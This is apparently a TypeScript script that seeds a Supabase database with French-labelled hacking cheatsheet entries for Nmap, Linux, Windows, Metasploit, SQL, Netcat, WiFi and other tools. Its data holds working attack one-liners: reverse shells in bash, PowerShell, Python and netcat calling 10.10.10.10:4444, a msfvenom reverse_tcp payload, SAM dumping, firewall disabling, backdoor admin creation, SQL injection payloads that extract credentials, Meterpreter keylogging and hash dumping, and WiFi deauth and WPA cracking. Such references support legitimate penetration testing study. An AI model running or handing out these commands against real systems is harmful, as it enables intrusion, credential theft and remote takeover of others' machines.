import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';
import path from 'path';

dotenv.config({ path: path.resolve(process.cwd(), '.env.local') });

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY!;
const supabase = createClient(supabaseUrl, supabaseKey);

// Real cheatsheet templates for each category
const cheatsheetTemplates = {
    'Nmap': [
        { desc: 'Scan de base avec détection de version', cmd: 'nmap -sV <target>' },
        { desc: 'Scan complet de tous les ports', cmd: 'nmap -p- <target>' },
        { desc: 'Scan rapide des ports communs', cmd: 'nmap -F <target>' },
        { desc: 'Scan avec scripts NSE par défaut', cmd: 'nmap -sC <target>' },
        { desc: 'Scan UDP', cmd: 'nmap -sU <target>' },
        { desc: 'Détection OS', cmd: 'nmap -O <target>' },
        { desc: 'Scan agressif', cmd: 'nmap -A <target>' },
        { desc: 'Scan furtif SYN', cmd: 'nmap -sS <target>' },
        { desc: 'Scan avec timing rapide', cmd: 'nmap -T4 <target>' },
        { desc: 'Export résultats en XML', cmd: 'nmap -oX scan.xml <target>' },
    ],
    'Linux': [
        { desc: 'Lister les fichiers avec permissions', cmd: 'ls -la' },
        { desc: 'Rechercher des fichiers SUID', cmd: 'find / -perm -4000 2>/dev/null' },
        { desc: 'Voir les processus en cours', cmd: 'ps aux' },
        { desc: 'Vérifier les connexions réseau', cmd: 'netstat -tulpn' },
        { desc: 'Historique des commandes', cmd: 'history' },
        { desc: 'Utilisateurs connectés', cmd: 'w' },
        { desc: 'Tâches cron', cmd: 'crontab -l' },
        { desc: 'Permissions sudo', cmd: 'sudo -l' },
        { desc: 'Kernel version', cmd: 'uname -a' },
        { desc: 'Recherche de mots de passe', cmd: 'grep -r "password" /etc/ 2>/dev/null' },
        { desc: 'Reverse shell bash', cmd: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' },
        { desc: 'Télécharger un fichier', cmd: 'wget http://example.com/file' },
        { desc: 'Créer un utilisateur', cmd: 'useradd -m -s /bin/bash newuser' },
        { desc: 'Changer les permissions', cmd: 'chmod +x script.sh' },
        { desc: 'Archiver un dossier', cmd: 'tar -czf archive.tar.gz /path/to/folder' },
    ],
    'Windows': [
        { desc: 'Liste des utilisateurs', cmd: 'net user' },
        { desc: 'Informations système', cmd: 'systeminfo' },
        { desc: 'Processus en cours', cmd: 'tasklist' },
        { desc: 'Connexions réseau', cmd: 'netstat -ano' },
        { desc: 'Partages réseau', cmd: 'net share' },
        { desc: 'Groupes locaux', cmd: 'net localgroup' },
        { desc: 'Tâches planifiées', cmd: 'schtasks /query' },
        { desc: 'Services Windows', cmd: 'sc query' },
        { desc: 'Reverse shell PowerShell', cmd: '$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' },
        { desc: 'Télécharger un fichier', cmd: 'certutil -urlcache -f http://example.com/file.exe file.exe' },
        { desc: 'Désactiver le firewall', cmd: 'netsh advfirewall set allprofiles state off' },
        { desc: 'Dump SAM', cmd: 'reg save HKLM\\SAM sam.hive' },
        { desc: 'Liste des patches', cmd: 'wmic qfe list' },
        { desc: 'Créer un utilisateur admin', cmd: 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add' },
    ],
    'Python': [
        { desc: 'Serveur HTTP simple', cmd: 'python3 -m http.server 8000' },
        { desc: 'Reverse shell Python', cmd: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' },
        { desc: 'Installer un package', cmd: 'pip install requests' },
        { desc: 'Créer un environnement virtuel', cmd: 'python3 -m venv venv' },
        { desc: 'Scanner de ports Python', cmd: 'python -c "import socket; [socket.socket().connect((\\"target\\", p)) for p in range(1,1024)]"' },
        { desc: 'Encoder en base64', cmd: 'python -c "import base64; print(base64.b64encode(b\'text\'))"' },
        { desc: 'Générer un hash MD5', cmd: 'python -c "import hashlib; print(hashlib.md5(b\'password\').hexdigest())"' },
        { desc: 'Requête HTTP GET', cmd: 'python -c "import requests; print(requests.get(\'http://example.com\').text)"' },
    ],
    'Metasploit': [
        { desc: 'Lancer msfconsole', cmd: 'msfconsole' },
        { desc: 'Rechercher un exploit', cmd: 'search <keyword>' },
        { desc: 'Utiliser un exploit', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
        { desc: 'Définir RHOSTS', cmd: 'set RHOSTS 10.10.10.10' },
        { desc: 'Définir LHOST', cmd: 'set LHOST 10.10.10.5' },
        { desc: 'Lancer l\'exploit', cmd: 'exploit' },
        { desc: 'Lister les sessions', cmd: 'sessions -l' },
        { desc: 'Interagir avec une session', cmd: 'sessions -i 1' },
        { desc: 'Meterpreter: shell système', cmd: 'shell' },
        { desc: 'Meterpreter: dump hashes', cmd: 'hashdump' },
        { desc: 'Meterpreter: screenshot', cmd: 'screenshot' },
        { desc: 'Meterpreter: keylogger', cmd: 'keyscan_start' },
        { desc: 'Générer un payload', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe > shell.exe' },
    ],
    'SQL': [
        { desc: 'Injection SQL basique', cmd: '\' OR 1=1--' },
        { desc: 'Union injection', cmd: '\' UNION SELECT NULL,NULL,NULL--' },
        { desc: 'Lister les bases de données', cmd: '\' UNION SELECT schema_name FROM information_schema.schemata--' },
        { desc: 'Lister les tables', cmd: '\' UNION SELECT table_name FROM information_schema.tables--' },
        { desc: 'Lister les colonnes', cmd: '\' UNION SELECT column_name FROM information_schema.columns WHERE table_name=\'users\'--' },
        { desc: 'Extraire des données', cmd: '\' UNION SELECT username,password FROM users--' },
        { desc: 'Bypass authentification', cmd: 'admin\'--' },
        { desc: 'Time-based blind injection', cmd: '\' AND SLEEP(5)--' },
        { desc: 'Boolean-based blind', cmd: '\' AND 1=1--' },
        { desc: 'Lire un fichier (MySQL)', cmd: '\' UNION SELECT LOAD_FILE(\'/etc/passwd\')--' },
    ],
    'Netcat': [
        { desc: 'Écouter sur un port', cmd: 'nc -lvnp 4444' },
        { desc: 'Se connecter à un port', cmd: 'nc <target> <port>' },
        { desc: 'Reverse shell', cmd: 'nc -e /bin/bash 10.10.10.10 4444' },
        { desc: 'Bind shell', cmd: 'nc -lvnp 4444 -e /bin/bash' },
        { desc: 'Transfert de fichier (envoi)', cmd: 'nc <target> 4444 < file.txt' },
        { desc: 'Transfert de fichier (réception)', cmd: 'nc -lvnp 4444 > file.txt' },
        { desc: 'Scanner de ports', cmd: 'nc -zv <target> 1-1000' },
        { desc: 'Banner grabbing', cmd: 'nc <target> 80' },
    ],
    'Wireshark': [
        { desc: 'Filtre HTTP', cmd: 'http' },
        { desc: 'Filtre par IP source', cmd: 'ip.src == 192.168.1.1' },
        { desc: 'Filtre par IP destination', cmd: 'ip.dst == 192.168.1.1' },
        { desc: 'Filtre par port', cmd: 'tcp.port == 80' },
        { desc: 'Filtre DNS', cmd: 'dns' },
        { desc: 'Filtre FTP', cmd: 'ftp' },
        { desc: 'Filtre contenant un mot', cmd: 'frame contains "password"' },
        { desc: 'Suivre un flux TCP', cmd: 'tcp.stream eq 0' },
    ],
    'WiFi': [
        { desc: 'Mode moniteur', cmd: 'airmon-ng start wlan0' },
        { desc: 'Scanner les réseaux', cmd: 'airodump-ng wlan0mon' },
        { desc: 'Capturer un handshake', cmd: 'airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon' },
        { desc: 'Deauth attack', cmd: 'aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon' },
        { desc: 'Cracker WPA', cmd: 'aircrack-ng -w wordlist.txt capture.cap' },
        { desc: 'Fake AP', cmd: 'airbase-ng -e "FreeWiFi" -c 6 wlan0mon' },
    ],
    'Burp Suite': [
        { desc: 'Configurer le proxy', cmd: 'Proxy > Options > 127.0.0.1:8080' },
        { desc: 'Intercepter les requêtes', cmd: 'Proxy > Intercept > Intercept is on' },
        { desc: 'Scanner une cible', cmd: 'Target > Site map > Right click > Scan' },
        { desc: 'Intruder attack', cmd: 'Right click > Send to Intruder' },
        { desc: 'Repeater', cmd: 'Right click > Send to Repeater' },
        { desc: 'Decoder', cmd: 'Decoder > Encode/Decode' },
    ],
};

async function generateMoreCheatsheets() {
    console.log("🚀 Generating additional cheatsheets...\n");

    const newCheatsheets: any[] = [];

    for (const [category, commands] of Object.entries(cheatsheetTemplates)) {
        console.log(`📝 ${category}: ${commands.length} cheatsheets`);

        for (const cmd of commands) {
            newCheatsheets.push({
                tool_name: category,
                category: category,
                command_data: [{
                    description: cmd.desc,
                    command_line: cmd.cmd
                }],
                created_at: new Date().toISOString()
            });
        }
    }

    console.log(`\n✨ Total new cheatsheets to add: ${newCheatsheets.length}`);
    console.log("💾 Inserting into database...\n");

    // Insert in batches
    const batchSize = 100;
    for (let i = 0; i < newCheatsheets.length; i += batchSize) {
        const batch = newCheatsheets.slice(i, i + batchSize);

        const { error } = await supabase
            .from('cheatsheets')
            .insert(batch);

        if (error) {
            console.error(`❌ Error inserting batch ${i}-${i + batch.length}:`, error);
        } else {
            console.log(`✅ Inserted ${i + batch.length}/${newCheatsheets.length}`);
        }
    }

    console.log("\n🎉 Done! New cheatsheets added.");

    // Show final counts
    const { data: counts } = await supabase
        .from('cheatsheets')
        .select('category')
        .limit(30000);

    if (counts) {
        const categoryCounts: Record<string, number> = {};
        counts.forEach(c => {
            categoryCounts[c.category] = (categoryCounts[c.category] || 0) + 1;
        });

        console.log("\n📊 Final category distribution:");
        Object.entries(categoryCounts)
            .sort((a, b) => b[1] - a[1])
            .forEach(([cat, count]) => {
                console.log(`   ${cat}: ${count}`);
            });
    }
}

generateMoreCheatsheets();
